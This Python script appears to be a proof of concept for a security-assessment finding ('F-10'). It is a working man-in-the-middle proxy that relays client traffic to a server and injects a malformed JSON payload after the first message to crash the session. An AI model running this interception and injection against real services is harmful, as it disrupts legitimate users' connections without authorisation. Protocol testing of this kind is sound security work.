#!/usr/bin/env python3
"""
mitm_F10.py - Malformed Input Injection
Finding: F-10
Violated: R9
The MITM injects a malformed (invalid JSON) message toward the server
after a normal AUTH. The server should handle it gracefully; instead
it raises an unhandled exception and drops the connection, crashing
the session for the legitimate client.
"""

import socket
import threading
import json
import time

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 9000
SERVER_HOST  = "10.0.0.3"
SERVER_PORT  = 9000

injected = [False]

MALFORMED_PAYLOAD = b'{"action": "LIST", "token": \x00\x01INVALID_BYTES}\n'


def forward_c2s(client_sock, server_sock):
    buf = b""
    try:
        while True:
            chunk = client_sock.recv(4096)
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                server_sock.sendall(line + b"\n")
                # After first message, inject malformed payload once
                if not injected[0]:
                    injected[0] = True
                    time.sleep(0.5)
                    print(f"\n[F-10 INJECT] Sending malformed payload to server\n")
                    server_sock.sendall(MALFORMED_PAYLOAD)
    except Exception:
        pass
    finally:
        try:
            server_sock.shutdown(socket.SHUT_WR)
        except Exception:
            pass


def forward_s2c(server_sock, client_sock):
    buf = b""
    try:
        while True:
            chunk = server_sock.recv(4096)
            if not chunk:
                print("[F-10] Server closed connection after malformed input")
                break
            buf += chunk
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                client_sock.sendall(line + b"\n")
    except Exception:
        pass
    finally:
        try:
            client_sock.shutdown(socket.SHUT_WR)
        except Exception:
            pass


def handle_connection(client_sock, client_addr):
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_sock.connect((SERVER_HOST, SERVER_PORT))
    except Exception as e:
        print(f"[MITM] Cannot connect to server: {e}")
        client_sock.close()
        return

    t1 = threading.Thread(target=forward_c2s, args=(client_sock, server_sock), daemon=True)
    t2 = threading.Thread(target=forward_s2c, args=(server_sock, client_sock), daemon=True)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    client_sock.close()
    server_sock.close()


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_HOST, LISTEN_PORT))
    srv.listen(5)
    print(f"[F-10] Malformed input injection active...")
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=handle_connection, args=(conn, addr), daemon=True).start()


if __name__ == "__main__":
    main()
